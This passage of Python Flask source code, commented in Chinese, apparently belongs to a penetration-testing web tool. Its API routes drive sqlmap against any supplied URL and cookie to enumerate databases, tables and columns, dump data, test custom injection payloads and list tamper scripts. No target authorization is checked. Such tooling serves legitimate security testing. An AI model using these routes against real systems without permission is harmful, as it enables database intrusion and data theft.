            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)

        result = controller.sqli_sqlmap_scan(target_url, method, post_data, cookie,
                                             level, risk, technique, tamper, extra_args)
        return jsonify(result)
    except Exception as e:
        logger.error(f"sqlmap扫描失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/databases', methods=['POST'])
def api_sqli_databases():
    """获取数据库列表"""
    global controller
    try:
        data = request.json
        target_url = data.get('target_url')
        cookie = data.get('cookie')

        if not target_url:
            return jsonify({"success": False, "error": "目标URL不能为空"})

        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)

        result = controller.sqli_get_databases(target_url, cookie)
        return jsonify(result)
    except Exception as e:
        logger.error(f"获取数据库失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/tables', methods=['POST'])
def api_sqli_tables():
    """获取表列表"""
    global controller
    try:
        data = request.json
        target_url = data.get('target_url')
        database = data.get('database')
        cookie = data.get('cookie')

        if not target_url or not database:
            return jsonify({"success": False, "error": "目标URL和数据库名不能为空"})

        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)

        result = controller.sqli_get_tables(target_url, database, cookie)
        return jsonify(result)
    except Exception as e:
        logger.error(f"获取表列表失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/columns', methods=['POST'])
def api_sqli_columns():
    """获取列信息"""
    global controller
    try:
        data = request.json
        target_url = data.get('target_url')
        database = data.get('database')
        table = data.get('table')
        cookie = data.get('cookie')

        if not all([target_url, database, table]):
            return jsonify({"success": False, "error": "目标URL、数据库名和表名不能为空"})

        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)

        result = controller.sqli_get_columns(target_url, database, table, cookie)
        return jsonify(result)
    except Exception as e:
        logger.error(f"获取列信息失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/dump', methods=['POST'])
def api_sqli_dump():
    """提取数据"""
    global controller
    try:
        data = request.json
        target_url = data.get('target_url')
        database = data.get('database')
        table = data.get('table')
        columns = data.get('columns')
        cookie = data.get('cookie')
        limit = data.get('limit', 50)

        if not all([target_url, database, table]):
            return jsonify({"success": False, "error": "目标URL、数据库名和表名不能为空"})

        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)

        result = controller.sqli_dump_data(target_url, database, table, columns, cookie, limit)
        return jsonify(result)
    except Exception as e:
        logger.error(f"数据提取失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/test-payload', methods=['POST'])
def api_sqli_test_payload():
    """测试自定义payload"""
    global controller
    try:
        data = request.json
        target_url = data.get('target_url')
        method = data.get('method', 'GET')
        param_name = data.get('param_name')
        payload = data.get('payload')
        params = data.get('params')
        cookie = data.get('cookie')

        if not all([target_url, param_name, payload]):
            return jsonify({"success": False, "error": "目标URL、参数名和payload不能为空"})

        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)

        result = controller.sqli_test_payload(target_url, method, param_name, payload, params, cookie)
        return jsonify(result)
    except Exception as e:
        logger.error(f"payload测试失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/payloads')
def api_sqli_payloads():
    """获取常用payload列表"""
    global controller
    try:
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        result = controller.sqli_get_payloads()
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/tampers')
def api_sqli_tampers():
    """获取tamper脚本列表"""
    global controller
    try:
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        result = controller.sqli_get_tampers()
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# ================================================================
# 任务状态管理API
# ================================================================

@app.route('/api/tasks/list')
def api_list_tasks():
    """列出所有任务"""
    global task_manager
    task_type = request.args.get('type')
    tasks = task_manager.list_tasks(task_type)
    return jsonify({"success": True, "tasks": tasks})

@app.route('/api/tasks/<task_id>')
def api_get_task(task_id):
    """获取单个任务状态"""
    global task_manager
    task = task_manager.get_task(task_id)
    if task:
        return jsonify({"success": True, "task": task})
    return jsonify({"success": False, "error": "任务不存在"})

@app.route('/api/tasks/<task_id>', methods=['DELETE'])
def api_delete_task(task_id):
    """删除任务"""
    global task_manager
    success = task_manager.delete_task(task_id)
    return jsonify({"success": success})
    